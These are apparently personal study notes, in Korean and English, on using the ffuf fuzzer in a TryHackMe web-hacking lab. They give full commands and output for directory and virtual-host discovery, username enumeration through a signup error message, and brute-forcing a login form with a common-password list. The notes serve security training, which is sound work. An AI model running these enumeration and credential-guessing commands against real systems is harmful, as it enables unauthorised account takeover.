# ffuf

https://github.com/ffuf/ffuf

## Automated Discovery 

the process of using tools to discover content rather than doing it manually

---


### -w 
switch to specify the wordlist we are going to use
### -u 
접속 대상 
### FUZZ
-w에 지정한 리스트의 내용이 한줄한줄 FUZZ 키워드와 교체되어서 실행됨   
In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request
```
root@ip-10-10-25-144:~# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.211.134/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.211.134/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

assets                  [Status: 301, Size: 178, Words: 6, Lines: 8]
contact                 [Status: 200, Size: 3108, Words: 747, Lines: 65]
customers               [Status: 302, Size: 0, Words: 1, Lines: 1]
development.log         [Status: 200, Size: 27, Words: 5, Lines: 1]
monthly                 [Status: 200, Size: 28, Words: 4, Lines: 1]
news                    [Status: 200, Size: 2538, Words: 518, Lines: 51]
private                 [Status: 301, Size: 178, Words: 6, Lines: 8]
robots.txt              [Status: 200, Size: 46, Words: 4, Lines: 3]
sitemap.xml             [Status: 200, Size: 1391, Words: 260, Lines: 43]
:: Progress: [4655/4655] :: Job [1/1] :: 4481 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
root@ip-10-10-25-144:~# 
```

## -H 
switch adds/edits a header (in this instance, the Host header)
```
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.75.9

```

## -fs 
지정한 사이즈의 결과를 제외할 때   
적용 전 : 사이즈 2395가 너무 많다 

```
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.75.9 

...
x-ray                   [Status: 200, Size: 2395, Words: 503, Lines: 52]
wingate                 [Status: 200, Size: 2395, Words: 503, Lines: 52]
zulu                    [Status: 200, Size: 2395, Words: 503, Lines: 52]
x                       [Status: 200, Size: 2395, Words: 503, Lines: 52]
...
```

사이즈 2395인 데이터를 제외하고 출력된다
```
root@ip-10-10-249-198:~# ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host:FUZZ.acmeitsupport.thm" -u http://10.10.75.9 -fs 2395

(ffuf 로고 생략)
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.75.9
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.acmeitsupport.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2395
________________________________________________

delta                   [Status: 200, Size: 51, Words: 7, Lines: 1]
yellow                  [Status: 200, Size: 56, Words: 8, Lines: 1]
:: Progress: [1907/1907] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```


## 실습 
실습 회원가입 페이지에서 이미 사용중인 ID로 새로 가입을 하려고 하면 "An account with this username already exists"라는 문구가 뜨는 것을 이용 

### -X 
specifies the request method, this will be a GET request by default, but it is a POST request in our example. 

### -d 
specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword

### -mr 
text on the page we are looking for to validate we've found a valid username.
```
root@ip-10-10-242-38:~# head /usr/share/wordlists/SecLists/Usernames/Names/names.txt
aaliyah
aaren
aarika
aaron
aartjan
aarushi
abagael
```
```
root@ip-10-10-242-38:~# ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type:application/x-www-form-urlencoded" -u http://10.10.3.25/customers/signup -mr "username already exists"

(ffuf 로고 생략)
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.3.25/customers/signup
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: username already exists
________________________________________________

admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
:: Progress: [10164/10164] :: Job [1/1] :: 1462 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
root@ip-10-10-242-38:~# 
```
## 실습 
위에서 알아낸 이미 사용중인 ID목록과 자주쓰는 비밀번호 목록을 이용해서 아이디 비번 찾기 
```
root@ip-10-10-242-38:~# cat valid_usernames.txt 
admin
robert
simon
steve
```
```
root@ip-10-10-242-38:~# head /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt 
123456
password
12345678
```
```
root@ip-10-10-242-38:~# ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.3.25/customers/login -fc 200

(ffuf 로고 생략)
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.3.25/customers/login
 :: Wordlist         : W1: valid_usernames.txt
 :: Wordlist         : W2: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=W1&password=W2
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1]
    * W1: steve
    * W2: thunder

:: Progress: [400/400] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
root@ip-10-10-242-38:~# 
```


---
---

### Course
[TryHackMe - Introduction to Web Hacking](https://tryhackme.com/module/intro-to-web-hacking)    
